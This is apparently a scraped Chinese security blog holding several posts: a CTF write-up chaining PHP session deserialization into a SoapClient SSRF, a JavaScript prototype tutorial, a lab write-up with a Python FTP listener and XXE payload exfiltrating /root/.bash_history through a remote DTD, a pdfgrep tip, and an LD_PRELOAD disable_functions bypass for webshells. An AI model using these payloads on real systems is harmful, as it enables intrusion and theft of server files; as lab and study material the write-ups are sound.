&#x27;user_agent&#x27; =&gt; &quot;AAA:BBB\\r\\n&quot;.&quot;Cookie:PHPSESSID=22704eeclr7famlh9s21m9to26&quot;, &#x27;uri&#x27; =&gt; &quot;123&quot;));$s = serialize($a);echo urlencode($s); 123http://172.81.210.82/?f=session_start&amp;name=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2Flocalhost%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3Db8govp8041cfm1cb307bsf66v3%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7Dserialize_handler=php_serialize 提交之后，就能看到，这里以php_serialize模式保存session的时候，会显示name的value值是一个序列化字符串 当我们直接访问这个页面，也就是以php的默认模式开启session的时候，就可以看到，这里将|后面的反序列化字符串，反序列化成了一个Soap类 要触发Soap的SSRF，还得需要触发它的__call方法，这样我们就可以尝试利用extract覆盖掉变量$b 去调用一个不存在的方法，就会触发SSRF 1http://172.81.210.82/?f=extract&amp;name=Soapclientb=call_user_func 这样，就可以让Soap带上自己的Cookie去访问flag.php，再次刷新页面，就可以看到flag了 ​"},{"title":"JS原型对象","date":"2020-04-19","updated":"2024-03-19","path":"2020/04/19/JS原型对象/","text":"一、什么是原型 原型是Javascript中的继承的基础，JavaScript的继承就是基于原型的继承。 JavaScript 常被描述为一种基于原型的语言 (prototype-based language)——每个对象拥有一个原型对象，对象以其原型为模板、从原型继承方法和属性。原型对象也可能拥有原型，并从中继承方法和属性，一层一层、以此类推。这种关系常被称为原型链 (prototype chain)，它解释了为何一个对象会拥有定义在其他对象中的属性和方法。 准确地说，这些属性和方法定义在Object的构造器函数(constructor functions)之上的prototype属性上，而非对象实例本身。 在传统的 OOP 中，首先定义“类”，此后创建对象实例时，类中定义的所有属性和方法都被复制到实例中。在 JavaScript 中并不如此复制——而是在对象实例和它的构造器之间建立一个链接（它是__proto__属性，是从构造函数的prototype属性派生的），之后通过上溯原型链，在构造器中找到这些属性和方法。 注意: 理解对象的原型（可以通过Object.getPrototypeOf(obj)或者已被弃用的__proto__属性获得）与构造函数的prototype属性之间的区别是很重要的。前者是每个实例上都有的属性，后者是构造函数的属性。也就是说，Object.getPrototypeOf(new Foobar())和Foobar.prototype指向着同一个对象。 以下三点需要谨记 牢记两点： ①__proto__和constructor属性是对象所独有的； ② prototype属性是函数所独有的。但是由于JS中函数也是一种对象，所以函数也拥有__proto__和constructor属性 ① 通过构造函数，new出的对象，新对象的__proto__指向构造函数的prototype ② 所有函数的__proto__指上Function()的prototype ③ 非构造函数new出的对象( {} new Object()对象的prototype)的__proto__指向Object的prototype ④Object的prototype的__proto__指向null 1.1 函数的原型对象 在JavaScript中，我们创建一个函数A(就是声明一个函数), 那么浏览器就会在内存中创建一个对象B，而且每个函数都默认会有一个属性 prototype 指向了这个对象( 即：prototype的属性的值是这个对象 )。这个对象B就是函数A的原型对象，简称函数的原型。这个原型对象B 默认会有一个属性 constructor 指向了这个函数A ( 意思就是说：constructor属性的值是函数A )。 看下面的代码： 123456789101112131415&lt;body&gt; &lt;script type=&quot;text/javascript&quot;&gt; /* 声明一个函数，则这个函数默认会有一个属性叫 prototype 。而且浏览器会自动按照一定的规则 创建一个对象，这个对象就是这个函数的原型对象，prototype属性指向这个原型对象。这个原型对象 有一个属性叫constructor 执行了这个函数 注意：原型对象默认只有属性：constructor。其他都是从Object继承而来，暂且不用考虑。 */ function Person () &#123; &#125; &lt;/script&gt;&lt;/body&gt; 下面的图描述了声明一个函数之后发生的事情： 来个无限套娃 1.2 使用构造函数创建对象 当把一个函数作为构造函数 (理论上任何函数都可以作为构造函数) 使用new创建对象的时候，那么这个对象就会存在一个默认的不可见的属性，来指向了构造函数的原型对象。 这个不可见的属性我们一般用 [[prototype]] 来表示，只是这个属性没有办法直接访问到。 看下面的代码： 123456789101112&lt;body&gt; &lt;script type=&quot;text/javascript&quot;&gt; function Person () &#123; &#125; /* 利用构造函数创建一个对象，则这个对象会自动添加一个不可见的属性 [[prototype]], 而且这个属性 指向了构造函数的原型对象。 */ var p1 = new Person(); &lt;/script&gt;&lt;/body&gt; 观察下面的示意图： 说明： 从上面的图示中可以看到，创建p1对象虽然使用的是Person构造函数，但是对象创建出来之后，这个p1对象其实已经与Person构造函数没有任何关系了，p1对象的[[ prototype ]]属性指向的是Person构造函数的原型对象。 如果使用new Person()创建多个对象，则多个对象都会同时指向Person构造函数的原型对象。 我们可以手动给这个原型对象添加属性和方法，那么p1,p2,p3…这些对象就会共享这些在原型中添加的属性和方法。 如果我们访问p1中的一个属性name，如果在p1对象中找到，则直接返回。如果p1对象中没有找到，则直接去p1对象的[[prototype]]属性指向的原型对象中查找，如果查找到则返回。(如果原型中也没有找到，则继续向上找原型的原型—原型链。 后面再讲)。 如果通过p1对象添加了一个属性name，则p1对象来说就屏蔽了原型中的属性name。 换句话说：在p1中就没有办法访问到原型的属性name了。 通过p1对象只能读取原型中的属性name的值，而不能修改原型中的属性name的值。 p1.name = “李四”; 并不是修改了原型中的值，而是在p1对象中给添加了一个属性name。 看下面的代码： 12345678910111213141516171819202122232425262728293031&lt;body&gt; &lt;script type=&quot;text/javascript&quot;&gt; function Person () &#123; &#125; // 可以使用Person.prototype 直接访问到原型对象 //给Person函数的原型对象中添加一个属性 name并且值是 &quot;张三&quot; Person.prototype.name = &quot;张三&quot;; Person.prototype.age = 20; var p1 = new Person(); /* 访问p1对象的属性name，虽然在p1对象中我们并没有明确的添加属性name，但是 p1的 [[prototype]] 属性指向的原型中有name属性，所以这个地方可以访问到属性name 就值。 注意：这个时候不能通过p1对象删除name属性，因为只能删除在p1中删除的对象。 */ alert(p1.name); // 张三 var p2 = new Person(); alert(p2.name); // 张三 都是从原型中找到的，所以一样。 alert(p1.name === p2.name); // true // 由于不能修改原型中的值，则这种方法就直接在p1中添加了一个新的属性name，然后在p1中无法再访问到 //原型中的属性。 p1.name = &quot;李四&quot;; alert(&quot;p1：&quot; + p1.name); // 由于p2中没有name属性，则对p2来说仍然是访问的原型中的属性。 alert(&quot;p2:&quot; + p2.name); // 张三 &lt;/script&gt;&lt;/body&gt; 二、与原型有关的几个属性和方法 2.1 _proto_ 属性(注意：左右各是2个下划线) 用构造方法创建一个新的对象之后，这个对象中默认会有一个不可访问的属性 [[prototype]] , 这个属性就指向了构造方法的原型对象。 原型对象是无法直接访问的 ,但是在个别浏览器中，也提供了对这个属性[[prototype]]的访问(chrome浏览器和火狐浏览器。ie浏览器不支持)。访问方式：p1.proto 注意：必须重申，原型链中的方法和属性没有被复制到其他对象——它们被访问需要通过前面所说的“原型链”的方式。 注意：没有官方的方法用于直接访问一个对象的原型对象——原型链中的“连接”被定义在一个内部属性中，在 JavaScript 语言标准中用 [[prototype]] 表示（参见 ECMAScript）。然而，大多数现代浏览器还是提供了一个名为 proto （前后各有2个下划线）的属性，其包含了对象的原型。你可以尝试输入 person1.proto 和 person1.proto.proto，看看代码中的原型链是什么样的！ 但是开发者尽量不要用这种方式去访问，因为操作不慎会改变这个对象的继承原型链。 123456789101112131415&lt;script type=&quot;text/javascript&quot;&gt; function Person () &#123; &#125; //直接给Person的原型指定对象字面量。则这个对象的constructor属性不再指向Person函数 Person.prototype = &#123; constructor : Person, name:&quot;志玲&quot;, age:20 &#125;; var p1 = new Person(); alert(p1.__proto__ === Person.prototype); //true &lt;/script&gt; 12345function doSomething()&#123;&#125;doSomething.prototype.foo = &quot;bar&quot;; // add a property onto the prototypevar doSomeInstancing = new doSomething();doSomeInstancing.prop = &quot;some value&quot;; // add a property onto the objectconsole.log( doSomeInstancing ); 结果: 12345678910111213141516&#123; prop: &quot;some value&quot;, __proto__: &#123; foo: &quot;bar&quot;, constructor: ƒ doSomething(), __proto__: &#123; constructor: ƒ Object(), hasOwnProperty: ƒ hasOwnProperty(), isPrototypeOf: ƒ isPrototypeOf(), propertyIsEnumerable: ƒ propertyIsEnumerable(), toLocaleString: ƒ toLocaleString(), toString: ƒ toString(), valueOf: ƒ valueOf() &#125; &#125;&#125; 就像上面看到的, doSomeInstancing 的 proto 属性就是doSomething.prototype. 但是这又有什么用呢? 好吧,当你访问 doSomeInstancing 的一个属性, 浏览器首先查找 doSomeInstancing 是否有这个属性. 如果 doSomeInstancing 没有这个属性, 然后浏览器就会在 doSomeInstancing 的 proto 中查找这个属性(也就是 doSomething.prototype). 如果 doSomeInstancing 的 proto 有这个属性, 那么 doSomeInstancing 的 proto 上的这个属性就会被使用. 否则, 如果 doSomeInstancing 的 proto 没有这个属性, 浏览器就会去查找 doSomeInstancing 的 proto 的 proto ，看它是否有这个属性. 默认情况下, 所有函数的原型属性的 proto 就是 window.Object.prototype. 所以 doSomeInstancing 的 proto 的 proto (也就是 doSomething.prototype 的 proto (也就是 Object.prototype)) 会被查找是否有这个属性. 如果没有在它里面找到这个属性, 然后就会在 doSomeInstancing 的 proto 的 proto 的 proto 里面查找. 然而这有一个问题: doSomeInstancing 的 proto 的 proto 的 proto 不存在. 最后, 原型链上面的所有的 proto 都被找完了, 浏览器所有已经声明了的 proto 上都不存在这个属性，然后就得出结论，这个属性是 undefined. 123456789101112131415161718192021function doSomething()&#123;&#125;doSomething.prototype.foo = &quot;bar&quot;;var doSomeInstancing = new doSomething();doSomeInstancing.prop = &quot;some value&quot;;console.log(&quot;doSomeInstancing.prop: &quot; + doSomeInstancing.prop);console.log(&quot;doSomeInstancing.foo: &quot; + doSomeInstancing.foo);console.log(&quot;doSomething.prop: &quot; + doSomething.prop);console.log(&quot;doSomething.foo: &quot; + doSomething.foo);console.log(&quot;doSomething.prototype.prop: &quot; + doSomething.prototype.prop);console.log(&quot;doSomething.prototype.foo: &quot; + doSomething.prototype.foo);结果:doSomeInstancing.prop: some valuedoSomeInstancing.foo: bardoSomething.prop: undefineddoSomething.foo: undefineddoSomething.prototype.prop: undefineddoSomething.prototype.foo: bar 2.2 prototype属性 prototype 存在于构造函数中 (其实任意函数中都有，**他也是函数所独有的,**只是不是构造函数的时候prototype我们不关注而已) ，他指向了这个构造函数的原型对象。 参考前面的示意图。 继承的属性和方法是定义在 prototype 属性之上的（你可以称之为子命名空间 (sub namespace) ）——那些以 Object.prototype. 开头的属性，而非仅仅以 Object. 开头的属性。prototype 属性的值是一个对象，我们希望被原型链下游的对象继承的属性和方法，都被储存在其中。 于是 Object.prototype.watch()、Object.prototype.valueOf() 等等成员，适用于任何继承自 Object() 的对象类型，包括使用构造器创建的新的对象实例。 Object.is()、Object.keys()，以及其他不在 prototype 对象内的成员，不会被“对象实例”或“继承自 Object() 的对象类型”所继承。这些方法/属性仅能被 Object() 构造器自身使用。 注意：这看起来很奇怪——构造器本身就是函数，你怎么可能在构造器这个函数中定义一个方法呢？其实函数也是一个对象类型，你可以查阅 Function() 构造器的参考文档以确认这一点。 2.3 constructor属性 每个对象都可以找到其对应的constructor，因为创建对象的前提是需要有constructor，而这个constructor可能是对象自己本身显式定义的或者通过__proto__在原型链中找到的。而单从constructor这个属性来讲，只有prototype对象才有。每个函数在创建的时候，JS会同时创建一个该函数对应的prototype对象，而函数创建的对象.proto === 该函数.prototype，该函数.prototype.constructor===该函数本身，故通过函数创建的对象即使自己没有constructor属性，它也能通过__proto__找到对应的constructor，所以任何对象最终都可以找到其构造函数（null如果当成对象的话，将null除外）。如下： 看下面的代码： 123456789&lt;script type=&quot;text/javascript&quot;&gt; function Person () &#123; &#125; alert(Person.prototype.constructor === Person); // true var p1 = new Person(); //使用instanceof 操作符可以判断一个对象的类型。 //typeof一般用来获取简单类型和函数。而引用类型一般使用instanceof，因为引用类型用typeof 总是返回object。 alert(p1 instanceof Person); // true&lt;/script&gt; 我们根据需要，可以Person.prototype 属性指定新的对象，来作为Person的原型对象。 但是这个时候有个问题，新的对象的constructor属性则不再指向Person构造函数了。 看下面的代码： 123456789101112131415161718192021&lt;script type=&quot;text/javascript&quot;&gt; function Person () &#123; &#125; //直接给Person的原型指定对象字面量。则这个对象的constructor属性不再指向Person函数 Person.prototype = &#123; name:&quot;志玲&quot;, age:20 &#125;; var p1 = new Person(); alert(p1.name); // 志玲 alert(p1 instanceof Person); // true alert(Person.prototype.constructor === Person); //false //如果constructor对你很重要，你应该在Person.prototype中添加一行这样的代码： /* Person.prototype = &#123; constructor : Person //让constructor重新指向Person函数 &#125; */&lt;/script&gt; 2.4 实验 12345678910111213141516171819202122232425262728293031323334353637383940414243444546function Fun()&#123; &#125;// 我创造了一个函数Fn// 这个函数由Function生成（Function作为构造函数） var fn=new Fun()// 我创建了一个函数fn// 这个函数由Fn生成（Fn作为构造函数) console.log(fn.__proto__===Fun.prototype) //true// fn的__proto__指向其构造函数Fun的prototype console.log(Fun.__proto__===Function.prototype) //true// Fun的__proto__指向其构造函数Function的prototype console.log(Function.__proto__===Function.prototype) //true// Function的__proto__指向其构造函数Function的prototype// 构造函数自身是一个函数，他是被自身构造的 console.log(Function.prototype.__proto__===Object.prototype) //true// Function.prototype的__proto__指向其构造函数Object的prototype// Function.prototype是一个对象,同样是一个方法,方法是函数,所以它必须有自己的构造函数也就是Object console.log(Fun.prototype.__proto__===Object.prototype) //true// 与上条相同// 此处可以知道一点,所有构造函数的的prototype方法的__都指向__Object.prototype(除了....Object.prototype自身) console.log(Object.__proto__===Function.prototype) //true// Object作为一个构造函数(是一个函数对象!!函数对象!!),所以他的__proto__指向Function.prototype console.log(Object.prototype.__proto__===null) //true// Object.prototype作为一切的源头,他的__proto__是null// 下面是一个新的,额外的例子 var obj=&#123;&#125;// 创建了一个obj console.log(obj.__proto__===Object.prototype) //true// obj作为一个直接以字面量创建的对象，所以obj__proto__直接指向了Object.prototype，而不需要经过Function了！！// 下面是根据原型链延伸的内容// 还有一个上文并未提到的constructor, constructor在原型链中,是作为对象prototypr的一个属性存在的,它指向构造函数（由于主要讲原型链，这个就没在意、）； console.log(obj.__proto__.__proto__===null) //true console.log(obj.__proto__.constructor===Object) //true console.log(obj.__proto__.constructor.__proto__===Function.prototype) //true console.log(obj.__proto__.constructor.__proto__.__proto__===Object.prototype) //true console.log(obj.__proto__.constructor.__proto__.__proto__.__proto__===null) //true console.log(obj.__proto__.constructor.__proto__.__proto__.constructor.__proto__===Function.prototype) //true // 2.5 hasOwnProperty() 方法 大家知道，我们用去访问一个对象的属性的时候，这个属性既有可能来自对象本身，也有可能来自这个对象的[[prototype]]属性指向的原型。 那么如何判断这个对象的来源呢？ hasOwnProperty方法，可以判断一个属性是否来自对象本身。 123456789101112131415&lt;script type=&quot;text/javascript&quot;&gt; function Person () &#123; &#125; Person.prototype.name = &quot;志玲&quot;; var p1 = new Person(); p1.sex = &quot;女&quot;; //sex属性是直接在p1属性中添加，所以是true alert(&quot;sex属性是对象本身的：&quot; + p1.hasOwnProperty(&quot;sex&quot;)); // name属性是在原型中添加的，所以是false alert(&quot;name属性是对象本身的：&quot; + p1.hasOwnProperty(&quot;name&quot;)); // age 属性不存在，所以也是false alert(&quot;age属性是存在于对象本身：&quot; + p1.hasOwnProperty(&quot;age&quot;)); &lt;/script&gt; 所以，通过hasOwnProperty这个方法可以判断一个对象是否在对象本身添加的，但是不能判断是否存在于原型中，因为有可能这个属性不存在。 也即是说，在原型中的属性和不存在的属性都会返回fasle。 如何判断一个属性是否存在于原型中呢？ 2.6 in 操作符 in操作符用来判断一个属性是否存在于这个对象中。但是在查找这个属性时候，现在对象本身中找，如果对象找不到再去原型中找。换句话说，只要对象和原型中有一个地方存在这个属性，就返回true 123456789101112&lt;script type=&quot;text/javascript&quot;&gt; function Person () &#123; &#125; Person.prototype.name = &quot;志玲&quot;; var p1 = new Person(); p1.sex = &quot;女&quot;; alert(&quot;sex&quot; in p1); // 对象本身添加的，所以true alert(&quot;name&quot; in p1); //原型中存在，所以true alert(&quot;age&quot; in p1); //对象和原型中都不存在，所以false &lt;/script&gt; 回到前面的问题，如果判断一个属性是否存在于原型中： 如果一个属性存在，但是没有在对象本身中，则一定存在于原型中。 123456789101112131415161718192021&lt;script type=&quot;text/javascript&quot;&gt; function Person () &#123; &#125; Person.prototype.name = &quot;志玲&quot;; var p1 = new Person(); p1.sex = &quot;女&quot;; //定义一个函数去判断原型所在的位置 function propertyLocation(obj, prop)&#123; if(!(prop in obj))&#123; alert(prop + &quot;属性不存在&quot;); &#125;else if(obj.hasOwnProperty(prop))&#123; alert(prop + &quot;属性存在于对象中&quot;); &#125;else &#123; alert(prop + &quot;对象存在于原型中&quot;); &#125; &#125; propertyLocation(p1, &quot;age&quot;); propertyLocation(p1, &quot;name&quot;); propertyLocation(p1, &quot;sex&quot;);&lt;/script 三、组合原型模型和构造函数模型创建对象 3.1 原型模型创建对象的缺陷 原型中的所有的属性都是共享的。也就是说，用同一个构造函数创建的对象去访问原型中的属性的时候，大家都是访问的同一个对象，如果一个对象对原型的属性进行了修改，则会反映到所有的对象上面。 但是在实际使用中，每个对象的属性一般是不同的。张三的姓名是张三，李四的姓名是李四。 **但是，这个共享特性对 方法(属性值是函数的属性)又是非常合适的。**所有的对象共享方法是最佳状态。这种特性在c#和Java中是天生存在的。 3.2 构造函数模型创建对象的缺陷 在构造函数中添加的属性和方法，每个对象都有自己独有的一份(方法实际上是绑定在对象上的，而不是绑定在“类”中)，大家不会共享。这个特性对属性比较合适，但是对方法又不太合适。因为对所有对象来说，他们的方法应该是一份就够了，没有必要每人一份，造成内存的浪费和性能的低下。 12345678910111213&lt;script type=&quot;text/javascript&quot;&gt; function Person() &#123; this.name = &quot;李四&quot;; this.age = 20; this.eat = function() &#123; alert(&quot;吃完东西&quot;); &#125; &#125; var p1 = new Person(); var p2 = new Person(); //每个对象都会有不同的方法 alert(p1.eat === p2.eat); //fasle&lt;/script&gt; 可以使用下面的方法解决： 1234567891011121314&lt;script type=&quot;text/javascript&quot;&gt; function Person() &#123; this.name = &quot;李四&quot;; this.age = 20; this.eat = eat; &#125; function eat() &#123; alert(&quot;吃完东西&quot;); &#125; var p1 = new Person(); var p2 = new Person(); //因为eat属性都是赋值的同一个函数，所以是true alert(p1.eat === p2.eat); //true&lt;/script&gt; 但是上面的这种解决方法具有致命的缺陷：封装性太差。使用面向对象，目的之一就是封装代码，这个时候为了性能又要把代码抽出对象之外，这是反人类的设计。 3.3 使用组合模式解决上述两种缺陷 ​ 原型模式适合封装方法，构造函数模式适合封装属性，综合两种模式的优点就有了组合模式。 123456789101112131415161718192021&lt;script type=&quot;text/javascript&quot;&gt; //在构造方法内部封装属性 function Person(name, age) &#123; this.name = name; this.age = age; &#125; //在原型对象内封装方法 Person.prototype.eat = function (food) &#123; alert(this.name + &quot;爱吃&quot; + food); &#125; Person.prototype.play = function (playName) &#123; alert(this.name + &quot;爱玩&quot; + playName); &#125; var p1 = new Person(&quot;李四&quot;, 20); var p2 = new Person(&quot;张三&quot;, 30); p1.eat(&quot;苹果&quot;); p2.eat(&quot;香蕉&quot;); p1.play(&quot;志玲&quot;); p2.play(&quot;凤姐&quot;);&lt;/script&gt; 四、动态原型模式创建对象 前面讲到的组合模式，也并非完美无缺，有一点也是感觉不是很完美。把构造方法和原型分开写，总让人感觉不舒服，应该想办法把构造方法和原型封装在一起，所以就有了动态原型模式。 动态原型模式把所有的属性和方法都封装在构造方法中，而仅仅在需要的时候才去在构造方法中初始化原型，又保持了同时使用构造函数和原型的优点。 看下面的代码： 123456789101112131415161718192021&lt;script type=&quot;text/javascript&quot;&gt; //构造方法内部封装属性 function Person(name, age) &#123; //每个对象都添加自己的属性 this.name = name; this.age = age; /* 判断this.eat这个属性是不是function，如果不是function则证明是第一次创建对象， 则把这个funcion添加到原型中。 如果是function，则代表原型中已经有了这个方法，则不需要再添加。 perfect！完美解决了性能和代码的封装问题。 */ if(typeof this.eat !== &quot;function&quot;)&#123; Person.prototype.eat = function () &#123; alert(this.name + &quot; 在吃&quot;); &#125; &#125; &#125; var p1 = new Person(&quot;志玲&quot;, 40); p1.eat(); &lt;/script&gt; 说明： 组合模式和动态原型模式是JavaScript中使用比较多的两种创建对象的方式。 建议以后使用动态原型模式。他解决了组合模式的封装不彻底的缺点。 https://www.cnblogs.com/qdjianghao/p/10206872.html https://blog.csdn.net/cc18868876837/article/details/81211729 https://blog.csdn.net/cc18868876837/article/details/103149502"},{"title":"一个公司的面试题目-靶场","date":"2020-04-17","updated":"2024-03-19","path":"2020/04/17/一个公司的面试题目-靶场/","text":"投简历后,公司下发的靶场 要求60小时内做完(不是我投的简历),简单记录一下过程 扫一遍端口和目录,目录发现admin目录,抓包会看到xml形式传递数据,看看能不能xxe. 经过简单的测试发现可以盲打xxe,而且根据服务器接受的信息来看,靶场是java的.php协议不能用,无法将数据编码传输,所以http传输不能用.用ftp传输即可 这里用ftp://ip/data 来访问ftp服务器其实是没有真正链接上的,所以正常的ftp服务器是不行的.自己搭建一个来接收数据 先搭建一个ftp服务器 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263class FTPServer(SocketServer.BaseRequestHandler): def handle(self): &quot;&quot;&quot; FTP Java handler which can handle reading files and directories that are being sent by the server. &quot;&quot;&quot; self.request.settimeout(10) logger(&quot;[+] victim [&#123;&#125;] has connected FTP !&quot;.format(self.client_address[0]), is_print=True) self.request.sendall(&quot;220 ftp-server\\n&quot;) try: while True: self.data = self.request.recv(4096).strip() if self.data.startswith(&quot;RETR &quot;): logger(&quot;[+] FTP Received File:\\n&#123;separator&#125;\\n&#123;&#125;\\n&#123;separator&#125;&quot;.format(self.data.lstrip(&quot;RETR &quot;), separator=&quot;=&quot; * 50), is_print=True) else: in_key = False keys = [&quot;USER&quot;, &quot;PASS&quot;, &quot;TYPE&quot;, &quot;EPRT&quot;, &quot;EPSV&quot;, &quot;QUIT&quot;] for key in keys: if self.data.startswith(key): in_key = True logger(&quot;[+] FTP: &#123;&#125;&quot;.format(self.data), is_print=True) break if not in_key: if str(self.data) == &#x27;&#x27;: logger(&quot;[*] file exists! maybe target cannot send multi-lines file!(jdk&lt;7u141/jdk&lt;8u162 supported)&quot;.format(self.data), is_print=True) else: logger(&quot;&#123;&#125;&quot;.format(self.data[self.data.find(&quot; &quot;)+1:]), is_print=True) if &quot;LIST&quot; in self.data: self.request.sendall(&quot;drwxrwxrwx 1 owner group 1 Feb 21 01:11 rsl\\n&quot;) self.request.sendall(&quot;150 Opening BINARY mode data connection for /bin/ls\\n&quot;) self.request.sendall(&quot;226 Transfer complete.\\n&quot;) elif &quot;USER&quot; in self.data: self.request.sendall(&quot;331 password please - version check\\n&quot;) elif &quot;PORT&quot; in self.data: logger(&quot;[+] FTP PORT received&quot;) logger(&quot;[+] FTP &gt; 200 PORT command ok&quot;) self.request.sendall(&quot;200 PORT command ok\\n&quot;) elif &quot;SYST&quot; in self.data: self.request.sendall(&quot;215 RSL\\n&quot;) else: logger(&quot;[+] FTP &gt; 230 more data please!&quot;) self.request.sendall(&quot;230 more data please!\\n&quot;) except Exception as e: if &quot;timed out&quot; in e: logger(&quot;[*] FTP Client timed out&quot;) else: logger(&quot;[-] FTP Client error: &#123;&#125;&quot;.format(e), is_print=True) logger(&quot;[*] FTP Connection closed with &#123;&#125;&quot;.format(self.client_address[0]))def start_server(conn, serv_class): try: server = SocketServer.TCPServer(conn, serv_class) t = Thread(target=server.serve_forever) t.daemon = True t.start() except socket.error as e: if &quot;[Errno 10048]&quot; in str(e): exit(&quot;[-] Port [&#123;&#125;] is already in use&quot;.format(conn[1])) else: exit(str(e)) python ./xxeftp 2121启动 服务器上的secret.dtd 12&lt;!ENTITY % hacker &quot;&lt;!ENTITY send SYSTEM &#x27;ftp://服务器ip地址:2121/%file;&#x27;&gt;&quot;&gt;%hacker; 发送的payload: 12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % file SYSTEM &quot;file:///root/.bash_history&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://39.98.35.144:80/secret.dtd&quot;&gt; %dtd;]&gt;&lt;root&gt;&lt;reg&gt;&lt;name&gt;admin&lt;/name&gt;&lt;tel&gt;&amp;send;&lt;/tel&gt;&lt;email&gt;111111111@qq.com&lt;/email&gt;&lt;/reg&gt;&lt;/root&gt; file:// 是可以遍历目录的"},{"title":"Linux查找PDF内容","date":"2020-04-09","updated":"2024-03-19","path":"2020/04/09/Linux查找PDF内容/","text":"pdfgrep -R 'a pattern to search recursively from path' /some/path find /path -name '*.pdf' -exec sh -c 'pdftotext &quot;&#123;&#125;&quot; - | grep --with-filename --label=&quot;&#123;&#125;&quot; --color &quot;your pattern&quot;' \\; “ - ”是将pdftotext输出到stdout而不是文件的必要条件。pdftotext和grep选项将文件名放在grep的输出中。可选的pdfgrep标志很好，告诉grep使用终端上的颜色输出。 （在Ubuntu中，pdftotext由包grep或pdfgrep提供。） https://www.itranslater.com/qa/details/2119607760756147200"},{"title":"巧用LD_PRELOAD突破disable_functions","date":"2020-04-09","updated":"2024-03-19","path":"2020/04/09/巧用LD-PRELOAD突破disable-functions/","text":"https://www.freebuf.com/articles/web/192052.html 通常来说，导致 webshell 不能执行命令的原因大概有三类：一是 php.ini 中用 disable_functions 指示器禁用了 system()、exec() 等等这类命令执行的相关函数；二是 web 进程运行在 rbash 这类受限 shell 环境中；三是 WAF 拦劫。若是一则无法执行任何命令，若是二、三则可以执行少量命令。从当前现象来看，很可能由 disable_functions 所致。为验证，我利用前面的 RCE 漏洞执行 phpinfo()，确认的确如此： 有四种绕过 disable_functions 的手法：第一种，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；第二种，寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；第三种，mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制；第四种，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。 尝试第一种时，我用 phpinfo() 查看 ImageMagick 版本为 v6.9.4-10： 用 searchsploit（exploit-db.com 的本地版）搜索存在命令注入的版本为 v6.9.3-9 或 v7.0.1-0： 显然，当前 ImageMagick 无法利用；尝试第二种时，常见的、不常见的、罕见的（如 dl()），所有可启动进程的函数均被禁用；尝试第三种时，发现并未启用 mod_cgi 模式。所有希望，寄托在 LD_PRELOAD。 设想这样一种思路：利用漏洞控制 web 启动新进程 a.bin（即便进程名无法让我随意指定），a.bin 内部调用系统函数 b()，b() 位于系统共享对象 c.so 中，所以系统为该进程加载共 c.so，我想法在 c.so 前优先加载可控的 c_evil.so，c_evil.so 内含与 b() 同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内 b() 而非系统的 c.so 内 b()，同时，c_evil.so 可控，达到执行恶意代码的目的。基于这一思路，将突破 disable_functions 限制执行操作系统命令这一目标，大致分解成几步在本地推演：查看进程调用系统函数明细、操作系统环境下劫持系统函数注入代码、找寻内部启动新进程的 PHP 函数、PHP 环境下劫持系统函数注入代码。 查看进程调用系统函数明细。linux 创建新进程的过程较为复杂，我关心进程加载了哪些共享对象、可能调用哪些 API、实际调用了哪些 API。比如，运行 /usr/bin/id，通过 ldd 可查看系统为其加载的共享对象： 由于可执行文件 /usr/bin/id 内含符号表，所以，运行 nm -D /usr/bin/id 2&gt;&amp;1 或 readelf -Ws /usr/bin/id 可查看该程序可能调用的系统 API 明细： 由于程序运行时会根据命令行选项、运行环境作出不同反应，导致真正运行时调用的 API 可能只是 readefl 查看的子集，你可以运行 strace -f /usr/bin/id 2&gt;&amp;1 跟踪实际 API 调用情况，比如，实际调用 open() 的入参、返回值一目了然： 操作系统环境下劫持系统函数注入代码。linux 的环境变量 LD_PRELOAD 是一种类似 win32 API hook 的更优雅的实现，适用于打热补丁、读取进程空间数据、禁止程序调用指定 API、调试程序等等场景，甚至可以在不更改原始可执行文件前提下植入后门（管理员常用的 /bin/ps）。由于被劫持的系统函数得由我们重新实现一次，函数原型必须一致，为减少复杂性，我会选择劫持那些无参数且常用的系统函数，getuid() 就适合，以此为例，完整劫持过程步骤大致如下：首先，用 man 2 getuid 查看函数原型： 然后，编写同原型的 getuid() 函数，保存至 getuid_shadow.c，源码为： 执行 gcc -shared -fPIC getuid_shadow.c -o getuid_shadow.so 将其编译为共享对象： 最后，借助环境变量 LD_PRELOAD 劫持系统函数 getuid()，获取控制权。执行 LD_PRELOAD=/root/getuid_shadow.so /usr/bin/id，注入代码成功执行： 注意，LD_PRELOAD 是进程独占环境变量，类似于命令适配器，它与待执行命令间必须为空白字符，而非命令分隔符（;、&amp;&amp;、||）。 找寻内部启动新进程的 PHP 函数。虽然 LD_PRELOAD 为我提供了劫持系统函数的能力，但前提是我得控制 php 启动外部程序才行（只要有进程启动行为即可，无所谓是谁）。常见的 system() 启动程序方式显然不行，否则就不存在突破 disable_functions 一事了。PHP 脚本中除了调用 system()、exec()、shell_exec() 等等一堆 php 函数外，还有哪种可能启动外部程序呢？php 解释器自身！比如，php 函数 goForward() 实现“前进”的功能，php 函数 goForward() 又由组成 php 解释器的 C 语言模块之一的 move.c 实现，C 模块 move.c 内部又通过调用外部程序 go.bin 实现，那么，我的 php 脚本中调用了函数 goForward()，势必启动外部程序 go.bin。现在，我需要找到类似 goForward() 的真实存在的 PHP 函数。印象中，处理图片、请求网页、发送邮件等三类场景中可能存在我想要的函数，我得逐一验证。处理图片，通常调用 PHP 封装的 ImageMagick 库，新建 image.php，调用 